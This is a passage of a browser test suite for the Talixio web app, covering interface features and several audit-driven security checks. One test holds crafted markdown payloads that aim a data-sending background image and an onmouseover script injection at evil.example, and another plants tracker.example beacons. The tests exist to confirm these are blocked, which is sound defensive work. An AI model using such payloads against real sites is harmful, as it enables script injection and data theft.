    check('jobs: an empty directives section hints how to start a team', (await page.textContent('#directives .dir-hint')).includes('No directives yet'));
    // seed a directive with two workers directly in the shared store, as the director would
    const php = "$a=\\Talixio\\App::fromEnv();$d=$a->store->addDirective('Browser directive','compare and draft',1,0);"
      + "$w1=$a->store->addJob('researcher: compare','i','standard',1,'worker',null,0,[],'',null,'',$d,'researcher');"
      + "$w2=$a->store->addJob('writer: draft','i','fast',1,'worker',null,0,[],'',null,'',$d,'writer');"
      + "$a->store->updateJob($w1,['status'=>'done','cost_usd'=>0.4]);$a->store->updateJob($w2,['status'=>'running']);";
    execFileSync('php', ['-r', "require '" + join(root, 'src/autoload.php') + "';" + php],
      { env: { ...process.env, TALIXIO_DATA_DIR: data, TALIXIO_STORE: join(data, 'store'), TALIXIO_PROVIDER: 'echo', TALIXIO_WEB_PASSWORD: 'pw' } });
    await page.reload(); await page.waitForTimeout(500); // already on #jobs, so a hash change won't refetch — reload to pick up the seed
    await page.waitForSelector('#directives .task.dir', { timeout: 5000 });
    check('jobs: a directive shows as a row with its workers', (await page.textContent('#directives')).includes('Browser directive'));
    await page.click('#directives .task.dir .dir-exp'); await page.waitForTimeout(200);
    check('jobs: the directive expands to show its worker roles', /researcher/.test(await page.textContent('#directives .dir-workers')));
    check('jobs: the in-thread directive bar is activated while a worker runs', (await page.getAttribute('#dir-bar', 'hidden')) === null);
    check('voice: a dictation mic sits on the composer', await page.locator('#composer .dictate-btn[data-dictate-for="input"]').count() === 1);
    await page.fill('#jobs-search', 'x'); await page.waitForTimeout(400); await page.fill('#jobs-search', '');
    await page.click('#jobs-archived'); await page.waitForTimeout(400);
    check('jobs: the filters work', true);
  },
  async french({ browser, base, check }) {
    const ctx = await browser.newContext({ locale: 'fr-FR' }), p = await ctx.newPage();
    await p.goto(base + '/');
    await p.fill('#password', 'pw'); await p.press('#password', 'Enter');
    await p.waitForSelector('#shell:not([hidden])');
    await p.evaluate(() => { location.hash = '#library'; }); await p.waitForTimeout(800);
    check('french: the interface is translated', /Bibliothèque|Corbeille|Nouveau/.test(await p.textContent('body')));
    await ctx.close();
    // the account menu's "Langue" pins a language that persists: an English browser, pinned to French, must come up in French
    const ctx2 = await browser.newContext({ locale: 'en-US' }), p2 = await ctx2.newPage();
    await p2.goto(base + '/');
    await p2.evaluate(() => { try { const b = new URL(document.baseURI).pathname.replace(/\/$/, ''); localStorage.setItem((b ? b.slice(1) + ':' : '') + 'talixio.lang', 'fr'); } catch {} });
    await p2.goto(base + '/');
    await p2.fill('#password', 'pw'); await p2.press('#password', 'Enter');
    await p2.waitForSelector('#shell:not([hidden])');
    await p2.evaluate(() => { location.hash = '#library'; }); await p2.waitForTimeout(800);
    check('french: a pinned language overrides the browser default and persists across reloads',
      /Bibliothèque|Corbeille|Nouveau/.test(await p2.textContent('body')));
    await ctx2.close();
  },
  async oauthLink({ page, base, check }) {
    // audit, lot 6: a link made elsewhere, as if back from a sign-in page, cannot show its own words in the app
    await page.goto(base + '/?google=' + encodeURIComponent('Your account is locked: call 555-0100') + '#chat');
    await page.waitForSelector('#shell:not([hidden])'); await page.waitForTimeout(1200);
    const shown = await page.evaluate(() => document.querySelector('#toast')?.textContent || '');
    check('oauth: the words of a forged sign-in link are not shown', !shown.includes('555'), shown);
    check('oauth: the address is cleaned', !(await page.evaluate(() => location.search)).includes('google'));
  },
  async firstLook({ browser, base, check }) {
    // audit 5.1: what a French user sees first, the language pinned as the account menu does
    const ctx = await browser.newContext({ locale: 'fr-FR' }), p = await ctx.newPage();
    await p.goto(base + '/');
    await p.evaluate(() => { try { const b = new URL(document.baseURI).pathname.replace(/\/$/, ''); localStorage.setItem((b ? b.slice(1) + ':' : '') + 'talixio.lang', 'fr'); } catch {} });
    const refused = []; p.on('response', r => { if (r.status() === 401) refused.push(new URL(r.url()).pathname); });
    await p.goto(base + '/'); await p.waitForSelector('#password'); await p.waitForTimeout(500);
    check('first look: the sign-in page asks the server nothing it would refuse (audit U14)', refused.length === 0, refused.join(' '));
    await p.fill('#password', 'pw'); await p.press('#password', 'Enter');
    await p.waitForSelector('#shell:not([hidden])');
    await p.evaluate(() => { location.hash = '#library'; }); await p.waitForTimeout(600); await p.evaluate(() => { location.hash = '#chat'; }); await p.waitForTimeout(1500);
    const ph = await p.getAttribute('#input', 'placeholder');
    check('first look: the message box says "Écrire à …" once, not translated twice (audit U3)', /^Écrire à /.test(ph) && !/à à/.test(ph), ph);
    await p.evaluate(() => { location.hash = '#memory'; }); await p.waitForTimeout(800);
    check('first look: Memory lists no role among the skills, so no "Delete" on the protected assessor (audit U13)', !(await p.textContent('#skills')).includes('assessor'));
    await ctx.close();
  },
  async keyboard({ page, check }) {
    // audit 5.5: a menu takes the keyboard when it opens, the arrows move in it; Pilotage's tabs name their panels
    await go(page, 'chat');
    await page.focus('#account-btn'); await page.keyboard.press('Enter'); await page.waitForTimeout(300);
    const first = await page.evaluate(() => [document.activeElement?.closest('#account-menu') !== null, document.activeElement?.getAttribute('role'), document.activeElement?.textContent.trim()]);
    check('keyboard: the account menu takes the focus when it opens, on an item that says it is one', first[0] && first[1] === 'menuitem', JSON.stringify(first));
    await page.keyboard.press('ArrowDown'); await page.waitForTimeout(100);
    const next = await page.evaluate(() => document.activeElement?.textContent.trim());
    check('keyboard: the arrow moves to the next item', next !== first[2] && await page.evaluate(() => document.activeElement?.closest('#account-menu') !== null), next);
    await page.keyboard.press('Escape'); await page.waitForTimeout(200);
    await go(page, 'pilotage');
    const tabs = await page.evaluate(() => [...document.querySelectorAll('.ptab')].every(t => { const p = document.getElementById(t.getAttribute('aria-controls') || '-'); return p && p.getAttribute('role') === 'tabpanel'; }));
    check('keyboard: each Pilotage tab names the panel it shows', tabs);
  },
  async previewTracking({ browser, base, check }) {
    // audit S16: a saved page or an email with a picture from outside: previewing it loads nothing from outside.
    // Its own page: the blocked requests are written in that page's console, which is the point here.
    const ctx = await browser.newContext(), page = await ctx.newPage();
    await page.goto(base + '/'); await page.fill('#password', 'pw'); await page.press('#password', 'Enter'); await page.waitForSelector('#shell:not([hidden])');
    const sent = [];
    const spy = r => { if (r.url().includes('tracker.example') && r.failure()?.errorText !== 'csp') sent.push(r.url() + ' ' + (r.failure()?.errorText || 'loaded')); };
    page.on('requestfinished', spy); page.on('requestfailed', spy);
    const id = await page.evaluate(async () => {
      const fd = new FormData();
      fd.append('file', new File(['<html><head><title>News</title></head><body><p>Hello</p><img src="https://tracker.example/open.gif?who=me"><link rel="stylesheet" href="https://tracker.example/s.css"></body></html>'], 'newsletter.html', { type: 'text/html' }));
      fd.append('folder', '/Inbox');
      const r = await (await fetch('api/files', { method: 'POST', headers: { 'X-Talixio': '1' }, body: fd })).json();
      return r.id || r.file?.id;
    });
    await page.evaluate(async id => {
      const f = document.createElement('iframe'); f.sandbox = 'allow-popups'; document.body.appendChild(f);
      f.srcdoc = (await (await fetch(`api/files/${id}/preview`)).json()).html;
    }, id);
    await page.waitForTimeout(1200);
    check('preview: a page with a picture from outside shows without loading it', sent.length === 0, sent.join(' '));
    await ctx.close();
  },
  async files({ page, check }) {
    const closeAll = () => page.evaluate(() => document.querySelectorAll('dialog[open]').forEach(d => d.close()));
    await go(page, 'library');
    await page.click('#lib-tree >> text=Inbox'); await page.waitForTimeout(600);
    await page.click('#lib-list >> text=Idea for the newsletter'); await page.waitForTimeout(800);
    check('files: the note opens', (await page.textContent('#viewer-body')).includes('newsletter'));
    for (const b of ['#viewer-share', '#viewer-move', '#viewer-rename']) {
      await page.click('#viewer-more').catch(() => {});
      if (await page.isVisible(b)) { await page.click(b); await page.waitForTimeout(600); await closeAll(); }
    }
    await page.click('#viewer-close').catch(() => {});
    await go(page, 'library');
    await page.fill('#lib-q', 'newsletter'); await page.press('#lib-q', 'Enter'); await page.waitForTimeout(1200);
    check('files: the search finds the note', (await page.textContent('#view-library')).includes('newsletter'));
  },
  async boardActions({ page, check }) {
    await go(page, 'board');
    await page.click('#view-board [data-mode=list]'); await page.waitForTimeout(500);
    await page.click('#view-board .tl-head input[type=checkbox]');
    check('list: selecting shows the bulk bar', await page.isVisible('#list-bulk'));
    await page.click('#view-board .tl-head input[type=checkbox]');
    await page.click('#view-board [data-mode=board]'); await page.waitForTimeout(500);
    await page.click('#view-board .kcard .kmore'); await page.waitForTimeout(500);
    check('board: the card menu opens', await page.isVisible('#move-sheet'));
    await page.keyboard.press('Escape');
  },
  async settingsSave({ page, check }) {
    await go(page, 'settings');
    // nothing touched: no "unsaved change" (it used to show one for a server value the list does not offer: audit U12)
    check('settings: opening them shows no unsaved change', await page.isHidden('#set-save'));
    await page.fill('#set-search', 'heartbeat'); await page.waitForTimeout(400);
    const f = page.locator('#set-TALIXIO_HEARTBEAT_MINUTES');
    await f.fill(String((+(await f.inputValue()) || 0) + 30)); await f.dispatchEvent('input'); await page.waitForTimeout(200);
    check('settings: a change shows the save bar', await page.isVisible('#set-save'));
    await page.click('#set-save-btn'); await page.waitForTimeout(800);
    check('settings: saving works', await page.isHidden('#set-save'));
    await page.fill('#set-search', ''); await page.waitForTimeout(200);
  },
  async markdown({ page, check }) {
    await go(page, 'chat');
    await page.fill('#input', '# Plan\n\n**bold** and `code`\n\n- one\n- two\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n```\nx = 1\n```');
    await page.click('#send');
    await page.waitForSelector('#thread table', { timeout: 10000 }).catch(() => {});
    check('markdown: lists, code and tables render', await page.evaluate(() => { const h = [...document.querySelectorAll('#thread .msg')].pop()?.innerHTML || ''; return ['<strong>', '<li>', '<table>', '<code>'].every(t => h.includes(t)); }));
  },
  async markdownInjection({ page, check }) {
    // audit S1: a placeholder of a first link must never be expanded inside the href of a second one
    const outside = [];
    const spy = r => { if (!r.url().startsWith(new URL(page.url()).origin) && !r.url().startsWith('data:')) outside.push(r.url()); };
    page.on('request', spy);
    const payloads = [
      '[a](https://evil.example/[b](tel:/style=position:fixed;inset:0;z-index:99999;background:url\\(https://evil.example/px?d=DATA\\);x:))',
      '[a](https://evil.example/`x`onmouseover=alert(1)//)',
      '[a](https://evil.example/\u00000\u0000)',
      '[a](#library/\\)x)',
    ];
    const res = await page.evaluate(ps => {
      const boxes = ps.map(p => { const b = document.createElement('div'); b.className = 'md-probe doc'; b.innerHTML = md(p); document.body.appendChild(b); return b; });
      const out = boxes.map(b => [...b.querySelectorAll('*')].flatMap(e => [...e.attributes].map(a => a.name)).filter(n => n === 'style' || n.startsWith('on')));
      const box = document.createElement('div'); box.className = 'md-probe'; document.body.appendChild(box);
      box.innerHTML = md('see [the doc](https://example.org/a) and **[bold link](https://example.org/b)**');
      const links = [...box.querySelectorAll('a')].map(a => [a.getAttribute('href'), a.closest('strong') ? 'b' : '', a.textContent]);
      return { out, links };
    }, payloads);
    await page.waitForTimeout(800); // the rendered payloads stay on screen: a background image would load now
    page.off('request', spy);
    await page.evaluate(() => document.querySelectorAll('.md-probe').forEach(b => b.remove()));
    check('markdown: no style or on* attribute comes out of a crafted link', res.out.every(a => a.length === 0), JSON.stringify(res.out));
    check('markdown: a crafted link sends no request to another host', outside.length === 0, outside.join(' '));
    check('markdown: a plain link and a link in bold still render', JSON.stringify(res.links) === JSON.stringify([['https://example.org/a', '', 'the doc'], ['https://example.org/b', 'b', 'bold link']]), JSON.stringify(res.links));
  },
  async shareTarget({ page, check, base }) {
    // audit S2: a share is only stored once the user says yes in the app
    const url = await page.evaluate(async () => {
      const fd = new FormData(); fd.append('text', 'shared words'); fd.append('files', new File(['hello'], 'shared-probe.txt', { type: 'text/plain' }));
      return (await fetch('share', { method: 'POST', body: fd })).url;
    });
    check('share: posting from the app gives a share link', /[?&]share=[a-f0-9]{32}/.test(url), url);
    const inInbox = async () => JSON.stringify(await api(page, 'api/library?folder=/Inbox')).includes('shared-probe.txt');
    await page.goto(url);
    await page.waitForSelector('#banner:not([hidden]) #banner-action:not([hidden])', { timeout: 8000 });
    const asked = await page.textContent('#banner-text');
    check('share: the app asks before adding, and names the files', asked.includes('shared-probe.txt'), asked);
    check('share: nothing is in the inbox nor in the message box before the user agrees',
      !(await inInbox()) && (await page.inputValue('#input')) === '' && await page.isHidden('#pending-files'));
    await page.click('#banner-action');
    await page.waitForSelector('#pending-files:not([hidden])', { timeout: 8000 });
    check('share: once agreed, the file is attached and the text prefilled', await inInbox() && (await page.inputValue('#input')).includes('shared words')
      && (await page.textContent('#pending-files')).includes('shared-probe.txt'));
    await page.fill('#input', ''); await page.evaluate(() => { state.pending.length = 0; renderPending(); });
  },
  async cardText({ page, check }) {
    await go(page, 'board');
    await page.click('#view-board .kcard');
    await page.waitForSelector('#card-dialog[open]');
    await page.click('#cd-rte [contenteditable]');
    await page.keyboard.type('First step: call Sam');
    await page.keyboard.press('Enter');
    await page.keyboard.type('- check the price');
    await page.click('#card-form [type=submit]'); await page.waitForTimeout(800);
    await page.click('#view-board .kcard'); await page.waitForSelector('#card-dialog[open]');
    check('card: the description is kept', (await page.textContent('#cd-rte')).includes('call Sam'));
  },
  async shareLink({ page, check }) {
    await go(page, 'library');
    await page.click('#lib-tree >> text=Inbox'); await page.waitForTimeout(600);
    await page.click('#lib-list >> text=Idea for the newsletter'); await page.waitForTimeout(800);
    await page.click('#viewer-more').catch(() => {});
    await page.click('#viewer-share'); await page.waitForSelector('#share-dialog[open]');
    await page.fill('#sh-label', 'For Sam');
    await page.click('#sh-form [type=submit]'); await page.waitForTimeout(800);
    check('share: the link is made', (await page.textContent('#share-dialog')).includes('For Sam'));
  },
  async spaceEdit({ page, check }) {
    await go(page, 'chat');
    await page.click('#space-btn');
    await page.click('#space-menu [data-act=edit]');
    await page.waitForSelector('#space-dialog[open]');
    await page.fill('#sp-instructions', 'Answer briefly.');
    await page.click('#space-form [type=submit]'); await page.waitForTimeout(800);
    check('spaces: the instructions are saved', JSON.stringify(await api(page, 'api/spaces')).includes('Answer briefly.'));
    // the fleet-orchestrator panel (one per assistant, bootstrapped from the space editor)
    await page.click('#space-btn');
    await page.click('#space-menu [data-act=edit]');
    await page.waitForSelector('#space-dialog[open]');
    check('spaces: the orchestrator panel is shown', await page.isVisible('#sp-orch-row'));
    await page.click('#sp-orch-connect');
    await page.waitForSelector('#sp-orch-steps:not([hidden])', { timeout: 4000 });
    check('spaces: Connect reveals the orchestrator bootstrap steps', /"type":"pair"/.test(await page.textContent('#sp-orch-steps')));
    await page.click('#sp-cancel');
  },
  async pilotage({ page, check, root, data }) {
    // the director's cockpit: four tabs over machinery already shipped, voice-first
    // seed one non-protected role so the catalogue has a card to group, specialize and run the lifecycle on
    execFileSync('php', ['-r', "require '" + join(root, 'src/autoload.php') + "';"
      + "\\Talixio\\App::fromEnv()->skills()->save('browser-role','A role for the browser test','Do the browser thing.',['kind'=>'role']);"],
      { env: { ...process.env, TALIXIO_DATA_DIR: data, TALIXIO_STORE: join(data, 'store'), TALIXIO_PROVIDER: 'echo', TALIXIO_WEB_PASSWORD: 'pw' } });
    await go(page, 'pilotage');
    check('pilotage: the view shows', await page.isVisible('#view-pilotage'));
    check('pilotage: it is reachable from the rail', await page.isVisible('.rail a[data-view=pilotage]'));
    // the Agents tab leads, with the push-to-talk composer and the orchestrator panel moved here
    check('pilotage: Agents is the opening tab', await page.isVisible('.pilot-panel[data-ppanel=agents] .pilot-status'));
    check('pilotage: there is no permanent talk-to-the-pilot card any more', !(await page.$('#view-pilotage .pilot-talk')));
    await page.evaluate(() => { document.querySelector('#pilot-cfg').open = true; });
    await page.click('#pilot-orch-connect');
    await page.waitForSelector('#pilot-orch-steps:not([hidden])', { timeout: 4000 });
    check('pilotage: Connect reveals the orchestrator bootstrap steps', /"type":"pair"/.test(await page.textContent('#pilot-orch-steps')));
    // the agents tab: the status card, the pilot's three tabs (hidden until paired)
    check('pilotage: the agents tab shows the status card', await page.isVisible('.pilot-panel[data-ppanel=agents] .pilot-status'));
    check('pilotage: the status card names the autonomous pilot', /pilot/i.test(await page.textContent('#pilot-conn-title')));
    check('pilotage: with nothing paired, the three tabs are not shown (the status invites pairing)', await page.isHidden('#pl-tabs') && /pair/i.test(await page.textContent('#pilot-orch-status')));
    check('pilotage: the Knowledge-base tab carries a source badge slot', (await page.$$('.ptab[data-ptab=kb] .ptab-src')).length === 1);
    // 1.13.0: pair the pilot and file one report, then check the fleet-reports toggle + feed (details live here, badge in the menu)
    execFileSync('php', ['-r', "require '" + join(root, 'src/autoload.php') + "';"
      + "$con=\\Talixio\\App::fromEnv()->conductor();"
      + "preg_match('/\"code\":\"([0-9a-f]+)\"/',$con->setup(),$m);"
      + "[$c,$r]=$con->inbox(['type'=>'pair','code'=>$m[1],'webhook'=>'https://orch.example/hook','session'=>'sess_browser'],'');"
      + "$con->setNotify('inapp');"
      + "$con->inbox(['type'=>'report','title'=>'Build','text'=>'browser fleet report','agents'=>["
      + "['id'=>'w1','name'=>'dossier-conseil','state'=>'waiting','waiting'=>['kind'=>'decision','type'=>'L3','question'=>'Garder le plan A ou B ?','options'=>['Plan A','Plan B'],'cost'=>'deux jours de reprise']],"
      + "['id'=>'w2','name'=>'deploy','state'=>'waiting','waiting'=>['kind'=>'approval','question'=>'Token revoked']],"
      + "['id'=>'w3','name'=>'calme','state'=>'active']]],$r['secret']);"
      + "$con->inbox(['type'=>'report','agent'=>'w3','text'=>'calm reply'],$r['secret']);"],
      { env: { ...process.env, TALIXIO_DATA_DIR: data, TALIXIO_STORE: join(data, 'store'), TALIXIO_PROVIDER: 'echo', TALIXIO_WEB_PASSWORD: 'pw' } });
    await page.click('#view-pilotage .ptab[data-ptab=roles]'); await page.waitForTimeout(200);
    await page.click('#view-pilotage .ptab[data-ptab=agents]'); await page.waitForSelector('#pilot-notify-row:not([hidden])', { timeout: 6000 });
    check('pilotage: once paired, the fleet-reports toggle appears with three modes, one selected',
      (await page.$$('#pilot-notify [data-notify]')).length === 3 && (await page.$$('#pilot-notify [data-notify].on')).length === 1);
    // 1.18.0: three tabs, each a list and a pane that scrolls on its own
    check('pilotage: once paired the pilot has four tabs — Needs you, Agents, Journal, Autonomy', (await page.$$('#pl-tabs .pl-tab')).length === 4 && await page.isVisible('#pl-tabs'));
    check('pilotage: the Needs you tab counts the two sessions waiting', (await page.textContent('#pl-bd-need')).trim() === '2');
    check('pilotage: Needs you lists them, the decision first with its question and its options as buttons',
      (await page.$$('#pl-need-list .pl-rw[data-nsel^="w:"]')).length === 2 && /Garder le plan A ou B/.test(await page.textContent('#pl-need-detail'))
      && (await page.$$('#pl-need-detail [data-answer]')).length === 2 && /deux jours de reprise/.test(await page.textContent('#pl-need-detail')));
    check('pilotage: a waiting question shows the question, what a wrong choice costs, then the options and a free-text answer',
      await (async () => { const h = await page.innerHTML('#pl-need-detail .pl-ask'); const at = r => h.search(r); return at(/pl-q/) >= 0 && at(/pl-q/) < at(/If it goes wrong/) && at(/If it goes wrong/) < at(/data-answer/) && at(/data-answer/) < at(/pl-need-input/); })()
      && await page.isVisible('#pl-need-input') && await page.isVisible('#pl-need-mic'));
    await page.click('#pl-need-list .pl-rw[data-nsel="w:w2"]');
    check('pilotage: an approval offers no answer buttons, and says only the user can give it',
      (await page.$$('#pl-need-detail [data-answer]')).length === 0 && /Token revoked/.test(await page.textContent('#pl-need-detail')));
    await page.click('#pl-tabs .pl-tab[data-pl=autonomy]'); await page.waitForSelector('#pl-auto .pl-lv', { timeout: 6000 });
    check('pilotage: Autonomy lists the five levels, L4 and L5 are always the user\'s', (await page.$$('#pl-auto .pl-lv tbody tr')).length === 5 && (await page.$$('#pl-auto [data-auto-lv]')).length === 3);
    await page.check('#pa-on'); await page.selectOption('#pl-auto [data-auto-lv=L2]', 'tell'); await page.fill('#pa-pr', 'Client work first\nInternal tools later');
    await page.click('#pl-auto [data-auto-save]'); await page.waitForTimeout(700);
    const pol = await api(page, 'api/pilot');
    check('pilotage: the autonomy settings are saved on the server', pol.enabled === true && pol.levels.L2.mode === 'tell' && pol.levels.L4.mode === 'ask' && pol.priorities.join('|') === 'Client work first|Internal tools later');
    await page.click('#pl-tabs .pl-tab[data-pl=agents]'); await page.waitForSelector('#pl-ag-list .pl-rw', { timeout: 6000 });
    const rows = await page.$$eval('#pl-ag-list .pl-rw .pl-n', e => e.map(x => x.textContent.trim()));
    check('pilotage: Agents lists the three agents, those waiting first', rows.length === 3 && rows.slice(0, 2).sort().join() === 'deploy,dossier-conseil' && rows[2] === 'calme', rows.join('|'));
    check('pilotage: the unread replies of an agent show on its row and on the tab',
      (await page.textContent('#pl-bd-agents')).trim() === '1' && (await page.$$eval('#pl-ag-list .pl-rw', r => r.find(x => /calme/.test(x.textContent))?.querySelector('.pl-bd')?.textContent)) === '1');
    await page.click('#pl-ag-list .pl-rw[data-asel="w3"]'); await page.waitForSelector('#pl-msgs .pl-b', { timeout: 6000 });
    check('pilotage: opening an agent shows its conversation and a composer, and reading it clears its count',
      /calm reply/.test(await page.textContent('#pl-msgs')) && await page.isVisible('#pl-ag-input') && await page.isVisible('#pl-ag-send'));
    await page.waitForTimeout(500);
    check('pilotage: the unread badge on the Agents tab is gone once the conversation is read', await page.isHidden('#pl-bd-agents'));
    check('pilotage: the conversation pane scrolls on its own (the page does not grow with the messages)',
      (await page.$eval('#pl-msgs', e => getComputedStyle(e).overflowY)) === 'auto' && (await page.$eval('#pl-split-agents', e => e.getBoundingClientRect().height)) < 700);
    await page.click('#pl-ag-list .pl-rw[data-asel="w1"]'); await page.waitForSelector('#pl-ag-detail .pl-pin', { timeout: 6000 });
    check('pilotage: a waiting agent has its question pinned above the conversation, with the options',
      /Garder le plan A ou B/.test(await page.textContent('#pl-ag-detail .pl-pin')) && (await page.$$('#pl-ag-detail .pl-pin [data-answer]')).length === 2);
    await page.fill('#pl-ag-q', 'calme'); await page.waitForTimeout(150);
    check('pilotage: the agent search narrows the list', (await page.$$('#pl-ag-list .pl-rw')).length === 1);
    await page.fill('#pl-ag-q', '');
    await page.click('#pl-ag-f [data-f=waiting]');
    check('pilotage: the Waiting filter keeps the two blocked agents', (await page.$$('#pl-ag-list .pl-rw')).length === 2);
    await page.click('#pl-ag-f [data-f=all]');
    await page.click('#pl-tabs .pl-tab[data-pl=journal]'); await page.waitForSelector('#pl-jr-list .pl-rw', { timeout: 6000 });
    const jr = await page.textContent('#pl-jr-list');
    check('pilotage: the Journal holds the fleet-wide report and the alert for the blocked sessions, not the agents’ own replies',
      /Build/.test(jr) && /needs you/i.test(jr) && !/calm reply/.test(jr) && (await page.$$('#pl-jr-list .pl-pill.alert')).length >= 1);
    check('pilotage: a journal line opens its full text in the pane', /browser fleet report/.test(await page.textContent('#pl-jr-detail')) || (await page.$$('#pl-jr-list .pl-rw')).length >= 2);
    await page.click('#pl-jr-f [data-f=alert]');
    check('pilotage: the Alerts filter keeps only alerts', (await page.$$eval('#pl-jr-list .pl-rw .pl-pill', e => e.every(x => x.classList.contains('alert')))));
    await page.click('#pl-jr-f [data-f=pass]');
    check('pilotage: the Journal can show the orchestrator passes instead of reports', await page.isVisible('#pl-jr-list'));
    await page.click('#pl-jr-f [data-f=all]');
    check('pilotage: the status line counts what waits for the user', /2 /.test(await page.textContent('#pilot-orch-status')) && /wait|attend/i.test(await page.textContent('#pilot-orch-status')));
    await page.evaluate(() => { document.querySelector('#pilot-cfg').open = true; });
    await page.click('#pilot-status-btn'); await page.waitForFunction(() => /dossier-conseil/.test(document.querySelector('#pilot-status-text').textContent), null, { timeout: 6000 });
    const stx = await page.textContent('#pilot-status-text');
    check('pilotage: the Status file button shows the permanent status (agents, pending question, no secret) and where it lives',
      /Garder le plan A ou B/.test(stx) && /WAITING FOR YOU/.test(stx) && !/orch\.example/.test(stx) && /pilot-status\.md/.test(await page.textContent('#pilot-status-path')) && /status\.md\?download=1/.test(await page.getAttribute('#pilot-status-dl', 'href')));
    await page.click('#pilot-status-btn');
    await page.click('#pilot-notify [data-notify=off]'); await page.waitForTimeout(300);
    check('pilotage: switching fleet reports to Off is kept', (await page.$$('#pilot-notify [data-notify=off].on')).length === 1);
    await page.click('#pilot-notify [data-notify=inapp]'); await page.waitForTimeout(200);
    // tab switching reveals the Worksites/Chantiers board (the Director's directives)
    await page.click('#view-pilotage .ptab[data-ptab=chantiers]'); await page.waitForTimeout(400);
    check('pilotage: Worksites tab opens', await page.isVisible('.pilot-panel[data-ppanel=chantiers]'));
    await page.click('#view-pilotage .ptab[data-ptab=roles]');
    await page.waitForSelector('#pilot-roles .pnode', { timeout: 6000 });
    check('pilotage: Roles tab opens the specialization map (slice 2)', await page.isVisible('.pilot-panel[data-ppanel=roles]'));
    check('pilotage: each role is a clickable node carrying an acceptance ring',
      (await page.$$('#pilot-roles .pnode')).length >= 1
      && (await page.$$('#pilot-roles .pnode .pring')).length >= 1);
    // master → detail: a role is auto-selected, opening a detail card with its metrics and an Evaluate action
    await page.waitForSelector('#pilot-roles .prole-detail-card', { timeout: 6000 });
    check('pilotage: selecting a role opens a detail card with its ring and an Evaluate action',
      (await page.$$('#pilot-roles .prole-detail-card .pring')).length >= 1
      && (await page.$$('#pilot-roles .prole-detail-card [data-role-eval]')).length >= 1);
    check('pilotage: the assessor (role #0) is in the map, protected, so no Publish on it',
      (await page.textContent('#pilot-roles')).includes('assessor'));
    // slice 3: roles are grouped into bordered specialization cards
    check('pilotage: roles are grouped into specialization cards',
      (await page.$$('#pilot-roles .pspec-card')).length >= 1);
    // pick an editable (non-protected) role, open its detail, and use the inline specialization editor
    const editable = await page.$$eval('#pilot-roles [data-role-select]',
      els => { const b = els.find(e => e.dataset.roleSelect !== 'assessor'); return b ? b.dataset.roleSelect : null; });
    await page.click(`#pilot-roles [data-role-select="${editable}"]`);
    await page.waitForSelector('#pilot-roles .prole-detail-card form[data-role-spec]', { timeout: 6000 });
    check('pilotage: the detail card carries an inline specialization editor',
      (await page.$$('#pilot-roles .prole-detail-card form[data-role-spec]')).length >= 1);
    // slice 3: setting a specialization regroups the map under that heading
    const specForm = await page.$('#pilot-roles form[data-role-spec]');
    await specForm.$eval('.prole-spec-in', el => { el.value = 'QA'; });
    await specForm.evaluate(f => f.requestSubmit());
    await page.waitForSelector('#pilot-roles .pspec-name:text-is("QA")', { timeout: 6000 });
    check('pilotage: a saved specialization becomes a group-card header', await page.isVisible('#pilot-roles .pspec-name:text-is("QA")'));
    // slice 4: lifecycle actions on a non-protected role's detail card
    check('pilotage: a non-protected detail card carries Improve and Archive actions',
      (await page.$$('#pilot-roles .prole-detail-card [data-role-improve]')).length >= 1
      && (await page.$$('#pilot-roles .prole-detail-card [data-role-archive]')).length >= 1);
    // slice 4: Archive drops the role out of the map and into the Archived panel (history kept); Reactivate brings it back
    const archName = await page.$eval('#pilot-roles .prole-detail-card [data-role-archive]', b => b.dataset.roleArchive);
    page.once('dialog', d => d.accept());
    await page.click(`#pilot-roles [data-role-archive="${archName}"]`);
    await page.waitForSelector('#prole-arch-btn', { timeout: 6000 });
    check('pilotage: archiving drops the role out of the map',
      !(await page.$(`#pilot-roles .pnode[data-role-select="${archName}"]`)));
    await page.click('#prole-arch-btn');
    await page.waitForSelector(`#pilot-roles #prole-arch:not([hidden]) [data-role-reactivate="${archName}"]`, { timeout: 6000 });
    check('pilotage: the archived role is listed under Archived with Reactivate',
      (await page.$$(`#pilot-roles .parchived [data-role-reactivate="${archName}"]`)).length === 1);
    await page.click(`#pilot-roles [data-role-reactivate="${archName}"]`);
    await page.waitForSelector(`#pilot-roles .pnode[data-role-select="${archName}"]`, { timeout: 6000 });
    check('pilotage: Reactivate returns the role to the map', !!(await page.$(`#pilot-roles .pnode[data-role-select="${archName}"]`)));
    // slice 4: Improve opens the candidate-brief editor that feeds the Assessor's A/B
    await page.click(`#pilot-roles [data-role-select="${editable}"]`);
    await page.waitForSelector('#pilot-roles .prole-detail-card [data-role-improve]', { timeout: 6000 });
    await page.click('#pilot-roles .prole-detail-card [data-role-improve]');
    await page.waitForSelector('#prole-improve:not([hidden]) .prole-imp-in', { timeout: 6000 });
    check('pilotage: Improve opens a candidate-brief editor over the Assessor A/B', await page.isVisible('#prole-improve .prole-imp-in'));
    // "+ New role": the catalogue header opens a create form wired to role_save (same duplicate check)
    await page.click('#prole-new-btn');
    await page.waitForSelector('#prole-new:not([hidden]) .prole-new-name', { timeout: 6000 });
    check('pilotage: "+ New role" opens a create form with name, purpose, specialization and brief',
      await page.isVisible('#prole-new .prole-new-purpose') && await page.isVisible('#prole-new .prole-new-brief'));
    await page.fill('#prole-new .prole-new-name', 'meeting-notes');
    await page.fill('#prole-new .prole-new-purpose', 'summarise a meeting into decisions and actions');
    await page.fill('#prole-new .prole-new-spec', 'Veille');
    await page.fill('#prole-new .prole-new-brief', 'Summarise meetings: list decisions and actions with an owner, stay factual.');
    await page.click('#prole-new [data-new-save]');
    await page.waitForSelector('#pilot-roles .pspec-name:text-is("Veille")', { timeout: 8000 });
    check('pilotage: a created role lands in the map as a node under its specialization card',
      (await page.textContent('#pilot-roles')).includes('meeting-notes') && await page.isVisible('#pilot-roles .pspec-name:text-is("Veille")'));
    // slice 5: the KB tab is a read-only glance (counts + hub pull + a link into Library), not a one-line pointer
    await go(page, 'pilotage');
    await page.click('#view-pilotage .ptab[data-ptab=kb]');
    await page.waitForSelector('#pilot-kb .pkb .pkb-grid', { timeout: 6000 });
    check('pilotage: KB glance shows stat tiles and a link into Library',
      (await page.$$('#pilot-kb .pkb-stat')).length === 3
      && !!(await page.$('#pilot-kb .pkb-hub'))
      && !!(await page.$('#pilot-kb a[href^="#library"]')));
    // slice 5: the space switch lifted to the top of the rail shares the one builder and lists the spaces
    check('pilotage: a space switch sits at the top of the rail', await page.isVisible('#rail-space-btn'));
    await page.click('#rail-space-btn');
    await page.waitForSelector('#rail-space-menu:not([hidden]) .space-item', { timeout: 4000 });
